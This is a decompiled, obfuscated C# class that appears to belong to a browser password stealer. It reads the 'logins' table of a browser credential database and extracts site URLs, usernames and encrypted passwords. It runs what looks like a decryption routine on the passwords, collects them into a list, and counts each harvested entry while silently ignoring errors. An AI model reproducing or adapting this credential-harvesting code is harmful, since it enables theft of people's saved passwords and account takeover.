using System.Collections.Generic;
using ns13;

namespace ns12;

internal sealed class Class53
{
	public static List<GStruct10> smethod_0(string string_0)
	{
		try
		{
			List<GStruct10> list = new List<GStruct10>();
			Class58 @class = Class59.smethod_0(string_0, "logins");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				GStruct10 item = default(GStruct10);
				item.String_0 = Class47.smethod_2(@class.method_0(i, 0));
				item.String_1 = Class47.smethod_2(@class.method_0(i, 3));
				string text = @class.method_0(i, 5);
				if (text != null)
				{
					item.String_2 = Class47.smethod_2(Class47.smethod_4(string_0, text));
					list.Add(item);
					Class54.smethod_4(item.String_0);
					Class55.int_0++;
				}
			}
			return list;
		}
		catch
		{
			return new List<GStruct10>();
		}
	}
}
